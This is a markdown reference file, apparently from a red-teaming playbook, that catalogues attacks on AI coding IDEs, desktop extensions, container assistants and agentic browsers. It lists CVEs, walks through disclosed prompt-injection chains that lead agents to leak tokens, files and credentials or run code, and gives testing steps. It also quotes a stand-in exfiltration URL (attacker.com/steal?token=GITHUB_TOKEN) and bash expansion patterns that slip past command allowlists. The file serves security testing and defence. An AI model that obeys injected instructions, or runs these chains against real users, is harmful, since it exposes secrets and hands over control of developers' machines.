# IDE & Supply Chain Attack Patterns

Attack patterns targeting AI coding IDEs, desktop extensions, and software supply chain vectors. Extracted from agent-attack-patterns.md for progressive disclosure.

> **Related files:** [agent-attack-patterns.md](agent-attack-patterns.md) for OWASP Agentic Top 10, multi-agent attacks, novel techniques | [mcp-playbooks.md](mcp-playbooks.md) for MCP test procedures

---

## Table of Contents

- [IDEsaster: AI Coding IDE Attack Surface](#idesaster-ai-coding-ide-attack-surface)
- [Claude DXT Zero-Click RCE](#claude-dxt-zero-click-rce)
- [Claude Cowork File Exfiltration](#claude-cowork-file-exfiltration)
- [AI as C2 Proxy](#ai-as-c2-proxy)
- [Google Antigravity IDE Attack Surface](#google-antigravity-ide-attack-surface)

---

## IDEsaster: AI Coding IDE Attack Surface

A major new attack surface category: **30+ vulnerabilities across 10+ AI coding tools**, resulting in 24 CVEs (researcher Ari Marzouk). Named "IDEsaster" — AI coding assistants as vectors for RCE and credential theft.

**Key CVEs:**

| CVE | Tool | Impact | CVSS |
|-----|------|--------|------|
| CVE-2025-59536 | Claude Code | Arbitrary code execution through untrusted project hooks | 8.7 |
| CVE-2026-21852 | Claude Code | API key exfiltration when opening crafted repositories | 5.3 |
| CVE-2025-59944 | Cursor | Case-sensitivity bypass allowing file protection circumvention | -- |
| CVE-2025-61590/91/92/93 | Cursor | Workspace file and MCP connection manipulation leading to RCE | -- |
| CVE-2026-22708 | Cursor | Shell built-in bypass via environment variable poisoning in Allowlist mode | 9.8 |
| CVE-2026-26268 | Cursor | Git hook sandbox escape — writing to `.git/hooks` for out-of-sandbox RCE | -- |
| CVE-2026-0830 | Kiro (AWS) | Command injection in GitLab Helper via unquoted workspace paths | 8.4 |
| CVE-2025-7656 | Chromium (Cursor/Windsurf) | 94+ Chromium vulnerabilities in AI IDEs using legacy builds | -- |
| CVE-2026-29783 | GitHub Copilot CLI | Shell expansion arbitrary code execution via bash parameter patterns | HIGH |
| CVE-2026-21257 | GitHub Copilot/VS | Elevation-of-privilege/security feature bypass in AI-assisted editing | 8.0 |
| CVE-2026-21523 | GitHub Copilot/VS Code | AI-output validation failure — AI-generated suggestions become attack vectors | -- |
| CVE-2026-22812 | OpenCode | Unauthenticated HTTP server with permissive CORS — any website can execute shell commands | 8.8 |
| CVE-2025-64106 | Cursor | MCP installation deep-link RCE — masking malicious commands behind trusted dialog | 8.8 |
| CVE-2026-24887 | Claude Code | Confirmation prompt bypass via `find` command | -- |
| CVE-2026-28458 | OpenClaw | Browser Relay `/cdp` WebSocket endpoint missing authentication | 7.5 |
| CVE-2026-28468 | OpenClaw | Sandbox browser bridge unauthenticated access | -- |
| CVE-2026-28485 | OpenClaw | Unauthenticated `/agent/act` browser-control route — privileged ops without auth | Critical |
| CVE-2026-28462 | OpenClaw | Path traversal in browser control API — output writes outside temp dirs | High |
| CVE-2026-28466 | OpenClaw | Exec approval gating bypass via unsanitized `node.invoke` parameters | High |
| CVE-2026-28478 | OpenClaw | Webhook handler DoS — unbounded JSON body buffering by unauthenticated callers | Medium |
| CVE-2026-29610 | OpenClaw | PATH command hijacking — execute unintended binaries via env manipulation | High |
| CVE-2026-28484 | OpenClaw | Option injection RCE in git-hooks/pre-commit — attacker-controlled options lead to arbitrary code execution | High |
| CVE-2026-28479 | OpenClaw | SHA-1 collision attack on sandbox identifier cache keys — cache poisoning enables unsafe sandbox state reuse | 7.5 |
| CVE-2026-29609 | OpenClaw | `fetchWithGuard` memory exhaustion DoS — allocates entire response payloads before enforcing size limits | 7.5 |
| CVE-2026-28463 | OpenClaw | Exec-approvals allowlist validates pre-expansion argv tokens, but execution uses real shell expansion — safe bins like `head`, `tail`, `grep` can read arbitrary files via glob patterns | High |
| CVE-2026-28465 | OpenClaw | Voice-call plugin webhook verification bypass via forged forwarded headers — attacker bypasses caller allowlist | High |
| CVE-2026-21518 | GitHub Copilot/VS Code | Security feature bypass via command injection (CWE-77) — unauthorized network attacker bypasses workspace trust | High |
| CVE-2026-1868 | GitLab AI Gateway | Insecure template expansion in Duo Workflow Service — authenticated RCE on AI gateway | 9.9 |

**Cursor Workspace Trust Bypass (Oasis Security, 2026):**
- Cursor ships with **Workspace Trust disabled by default** — unlike VS Code which prompts users before trusting workspaces
- Enables silent code execution via malicious `.vscode/tasks.json` when opening untrusted repositories
- Combined with other IDEsaster patterns creates unopposed attack surface from repo clone
- Test for: open a crafted repository in Cursor and check if tasks.json auto-executes without trust prompt

**Rules File Backdoor (Pillar Security, 2026):**
- Configuration/rules files used by Cursor and GitHub Copilot can be weaponized with **invisible Unicode characters** — undetectable to humans but readable by AI agents
- One compromised rules file shared across projects creates widespread supply chain compromise
- Test for: inspect `.cursorrules`, `.github/copilot-instructions.md`, and similar config files for hidden Unicode content

**RoguePilot (Orca Security, February 2026):**
- AI-mediated supply chain attack: passive prompt injection via GitHub issues enabling **full repository takeover** through Codespaces/Copilot
- Attack uses hidden HTML comments (`<!--instructions-->`) invisible in issue rendering but parsed by Copilot
- **Symlink secret exfiltration**: injected prompt instructs Copilot to `gh pr checkout` a crafted PR containing a symlink (`1.json` → secrets file); guardrails don't follow symlinks, so agent reads secrets through the link
- **$schema exfiltration**: Copilot creates JSON file with `$schema` property pointing to `attacker.com/steal?token=GITHUB_TOKEN` — silent OOB exfil via JSON Schema resolution
- Full attack chain: malicious issue → HTML comment injection → Codespace launch → symlink PR checkout → token exfiltration → repository takeover with read/write access
- Patched by Microsoft — test for similar patterns in other IDE integrations that process issue/PR content

**CamoLeak (Legit Security, March 2026):**
- Critical vulnerability enabling **private source code exfiltration** from GitHub Copilot
- Attacker crafts repository content that triggers Copilot to leak private code from other repositories the victim has access to
- Exploits Copilot's code completion context — suggestions can include code from private repos
- Test for: context leakage in AI coding assistants that access multiple repositories

**PromptPwnd (Aikido Security, 2026):**
- Prompt injection in **GitHub Actions and GitLab CI/CD pipelines** exploits AI agents (Gemini CLI, Claude Code, OpenAI Codex)
- Attacker submits malicious GitHub issue with hidden instructions; AI agent leaks GEMINI_API_KEY, GITHUB_TOKEN, and Google Cloud access tokens
- At least **five Fortune 500 companies** confirmed affected; Google patched within 4 days
- Test for: AI agents running in CI/CD pipelines that process untrusted input (issues, PRs, comments)

**Copilot CLI Arbitrary Code Execution:**
- PromptArmor demonstrated GitHub Copilot CLI can download and execute malware with **zero user approval**
- CVE-2026-29783 (CVSS 8.8): shell tool in Copilot CLI ≤0.0.422 allows arbitrary code execution through bash parameter expansion patterns
- **Technical details**: parser validated the executable binary but failed to recursively sanitize arguments for side-effect-inducing syntax — dangerous patterns: `${var@P}` (prompt expansion), `${var=value}` / `${var:=value}` (assignment), `${!var}` (indirect expansion), nested `$(cmd)` or `<(cmd)` inside `${...}` expansions
- Prompt injection via repository files, MCP server responses, or user instructions can embed these patterns in commands classified as "read-only" — bypassing safety assessment entirely
- Patched in Copilot CLI 0.0.423 — test for similar shell expansion gaps in other AI CLI tools with command allowlists

**Extension Recommendation Attacks (Koi Security, 2026):**
- Cursor, Windsurf, Google Antigravity, and Trae recommend non-existent VSCode extensions from OpenVSX registry
- Threat actors can claim unclaimed extension namespaces and serve malicious extensions to 1.8M+ developers
- Attack chain: AI IDE recommends extension -> developer installs -> malicious code executes with full IDE permissions

**Reprompt (Varonis Threat Labs, January 2026):**
- Single-click data exfiltration chain exploiting the `q` URL parameter in Microsoft Copilot
- Attacker crafts URL containing injected instructions -> victim clicks -> Copilot exfiltrates user data and conversation memory
- Maintains persistent control even after chat is closed
- Test for: URL parameter injection in AI assistants, persistent instruction injection via conversation context

**Testing Approach:**
1. Clone a repository containing malicious `.claude/`, `.cursor/`, `.github/` configurations
2. Open in target AI IDE and observe if project hooks, MCP configs, or environment variables are automatically executed
3. Check if file protection mechanisms can be bypassed via case sensitivity or path traversal
4. Test if IDE extension recommendations can be manipulated to install attacker-controlled extensions
5. Verify if workspace file manipulation can inject MCP connections or alter build configurations
6. Check for legacy Chromium vulnerabilities if IDE uses embedded browser (94+ known flaws in Cursor/Windsurf builds)

---

## Claude DXT Zero-Click RCE

A critical vulnerability (CVSS 10.0) in Claude Desktop Extensions (DXT) discovered by LayerX (March 2026):

**How It Works:**
- 50+ Claude Desktop Extensions execute without sandboxing, with full host privileges
- Malicious calendar event instructions trigger RCE via Google Calendar DXT
- Attack chain: attacker creates calendar invite with prompt injection → victim's Claude processes calendar → DXT executes arbitrary commands on host
- Zero-click: no user interaction required beyond having the Calendar DXT installed

**Key Detail:** Anthropic declined to fix, stating it "falls outside current threat model." Affects 10,000+ active DXT users.

**PromptJacking (Koi AI, CVSS 8.9):** Separate from LayerX finding — three official Claude Desktop MCP extensions for Chrome, iMessage, and Apple Notes had **AppleScript command injection**. User-controlled data inserted directly into AppleScript commands without escaping. A malicious web page + prompt injection turned a normal Claude question ("Where can I play paddle in Brooklyn?") into arbitrary code execution. SSH keys, AWS credentials, browser passwords all exposed. Fixed in DXT v0.1.9. Root cause: classic unsanitized command injection across all three extensions.

**Testing Approach:**
1. If target uses Claude Desktop Extensions, check if DXT execution is sandboxed
2. Test if content from connected services (calendar, email, docs) can trigger DXT actions
3. Check for privilege boundaries between DXT execution and host system
4. Test if DXT tool calls are gated by user confirmation
5. Test if DXT extensions pass user-controlled data to shell/AppleScript commands without escaping
6. Test cross-DXT chaining: can one DXT's output trigger another DXT's code execution?

---

## Claude Cowork File Exfiltration

A prompt injection vulnerability enabling file theft via Anthropic's own whitelisted API (PromptArmor/Johann Rehberger, Jan 2026):

**How It Works:**
- Attacker uploads document containing hidden prompt injection to shared workspace
- When Claude Cowork analyzes the file, the injected prompt triggers automatically
- Injection instructs Claude to execute `curl` to Anthropic's file upload API using the **attacker's API key** (not the victim's)
- Code executed by Claude runs in a VM that restricts outbound network requests to most domains — **but the Anthropic API is whitelisted** as trusted, enabling exfiltration

**Key Detail:** Originally disclosed to Anthropic via HackerOne in October 2025 — closed within one hour as "out of scope." Anthropic shipped Claude Cowork on January 12, 2026 with the vulnerability unpatched. Affects Claude Haiku and Claude Opus 4.5. Demonstrates the risk of internal API whitelisting in sandboxed environments.

**Testing Approach:**
1. Identify which network endpoints are whitelisted in AI agent sandboxes
2. Test if whitelisted APIs can be used with attacker-controlled credentials
3. Embed prompt injection in documents that trigger file read + API upload chains
4. Check if the sandbox's own vendor API can serve as an exfiltration channel

**Severity Guidance:** High-Critical — enables zero-click file exfiltration from shared workspaces. The API whitelist bypass pattern is generalizable: any sandboxed AI system that whitelists its vendor's API creates an exfiltration channel.

---

## AI as C2 Proxy

A novel attack technique using AI web-browsing capabilities as bidirectional command-and-control channels (Check Point Research, January 2026):

**How It Works:**
- Copilot and Grok web-browsing features used as C2 channels without API keys or registered accounts
- Attacker posts encoded commands on attacker-controlled web pages
- Compromised system instructs AI to browse the page, extract commands, execute them, then browse another page to post results
- AI service acts as the relay — all traffic appears as normal AI browsing

**Testing Approach:**
1. If target AI agent can browse the web, test if it can be directed to attacker-controlled URLs
2. Test if responses from browsed pages can contain instructions the agent follows
3. Check if AI-initiated web requests are distinguishable from normal browsing (most aren't)
4. Test if output from AI can be directed to external endpoints

**Severity Guidance:** Critical if AI agent has both web browsing and code execution capabilities; High if limited to data exfiltration. This pattern bypasses traditional network monitoring because traffic originates from the AI service's infrastructure.

---

## Google Antigravity IDE Attack Surface

Google's AI coding IDE launched in early 2026 has rapidly accumulated a significant vulnerability portfolio:

**Key Findings:**
- **RCE via Web Page Interaction** ($10,000 bounty, Hacktron AI): critical RCE allowing full system takeover by opening a malicious website; disclosed February 9, 2026
- **Forced Descent -- Persistent Code Execution** (Mindgard): modifying a single global config file enables persistent code execution across projects, surviving uninstall/reinstall; no public patch as of March 2026
- **70+ Architectural Vulnerabilities** (community analysis): extensive security weaknesses in the platform's architecture identified within weeks of launch
- **Extension Namespace Squatting** (Koi Security): recommended non-existent extensions from OpenVSX, allowing attacker namespace registration; Google patched January 2026

**Testing Approach:**
1. Test for persistent code execution via global config file modification
2. Check if extension recommendations can be manipulated via namespace squatting
3. Test for web-triggered RCE via malicious page interaction
4. Audit the trust model for workspace files and project configurations

---

## DockerDash: Container Infrastructure MCP Attack

A critical vulnerability in Docker's Ask Gordon AI assistant demonstrates how MCP gateways in container tooling create RCE and data exfiltration paths (Noma Security, February 2026):

**How It Works:**
- Docker's Ask Gordon AI assistant uses an MCP Gateway to orchestrate container operations
- A single malicious Docker image metadata label can inject instructions into the AI context
- Two attack paths: (1) RCE on Cloud/CLI via container operations, (2) data exfiltration on Desktop via agent browsing
- Attack chain: attacker publishes Docker image with crafted label → victim pulls/inspects image → Ask Gordon processes label → MCP tools execute attacker commands

**Key Detail:** Fixed in Docker 4.50.0 with explicit confirmation requirements for MCP tool execution. Demonstrates that any MCP server processing untrusted container metadata is a supply chain attack vector.

**Testing Approach:**
1. If target uses AI assistants integrated with Docker/container infrastructure, check if image metadata is passed to AI context
2. Test if container labels, Dockerfile comments, or compose file descriptions influence AI assistant behavior
3. Check if MCP tool calls from container AI are gated by user confirmation
4. Test if malicious image metadata can trigger file read/write or network operations via MCP tools

**Severity Guidance:** Critical — zero-click via image pull; supply chain attack at container infrastructure level. Maps to ASI04 (Agentic Supply Chain) + ASI02 (Tool Misuse). Relevant for any enterprise using AI-powered container management tools.

---

## Universal AI IDE Prompt Injection (March 2026)

A six-month security research project reveals a **novel vulnerability class affecting 100% of tested AI IDEs** (GBHackers/Aikido Security):

**Key Findings:**
- All tested IDEs — GitHub Copilot, Cursor, Windsurf, Claude Code — vulnerable to prompt injection attacks that combine with legacy IDE features to enable RCE and data exfiltration
- **24 CVEs assigned**, 1.8M developers at risk
- Attack vector: prompt injection in GitHub Actions and GitLab CI/CD workflows exploits AI agents running in pipelines
- **OX Security Chromium exposure**: Cursor and Windsurf ship legacy Chromium builds with **94+ known vulnerabilities** — CVE-2025-7656 weaponized against latest versions

**Testing Approach:**
1. Test for prompt injection in CI/CD pipelines where AI agents process untrusted input (issues, PRs, comments, workflow logs)
2. Check if the AI IDE uses an embedded Chromium browser — test for known unpatched CVEs
3. Verify Chromium version in `process.versions.chrome` or about:version and cross-reference against known CVEs
4. Test prompt injection → legacy IDE feature chains (e.g., injection → task.json auto-execution → RCE)

---

## Cursor Shell Built-In Bypass (March 2026)

**CVE-2026-22708** — RCE via AI agent manipulation in Cursor's Auto-Run Mode (SentinelOne):

- Shell built-in commands bypass Cursor's command allowlist entirely
- Prompt injection can trigger arbitrary shell execution via AI agent
- Auto-Run Mode enables execution without user confirmation
- Attack vector: malicious code comments or README files trigger AI → shell execution chain

**Testing Approach:**
1. Create a project with prompt injection in code comments or documentation
2. Open in Cursor with Auto-Run Mode enabled
3. Trigger AI analysis (code completion, chat, or automated review)
4. Test if AI can be manipulated into running shell built-in commands (e.g., `eval`, `source`, `exec`)
5. Verify no confirmation prompt appears before execution

**Severity Guidance:** High-Critical — RCE from opening a project. Related: CVE-2025-54135 (CurXecute MCP auto-start RCE), CVE-2025-59944 (case-sensitivity bypass in file protections), Workspace Trust disabled by default.

---

## PerplexedBrowser: Agentic Browser Attacks (March 2026)

Zenity Labs disclosed critical vulnerabilities in agentic browsers (Perplexity Comet):

- **Attack chain:** Calendar invite with prompt injection → agent processes invite → accesses local file system → steals credentials from password managers (1Password)
- Zero-click: victim only needs to have the calendar event appear in their integrated calendar
- Agentic browsers combine browsing with tool execution (file access, app integration), creating trust boundary violations

**Testing Approach:**
1. Test if the agentic browser processes content from integrated services (calendar, email, messaging)
2. Inject prompt injection payloads into calendar invites, shared documents, or email subjects
3. Check if the agent can access local files, credentials, or other integrated apps
4. Test CDP/WebSocket endpoints — many agentic browsers expose unauthenticated debugging ports

**Severity Guidance:** Critical — zero-click credential theft via calendar invite. New attack surface class: any AI tool that processes external content and has local system access.
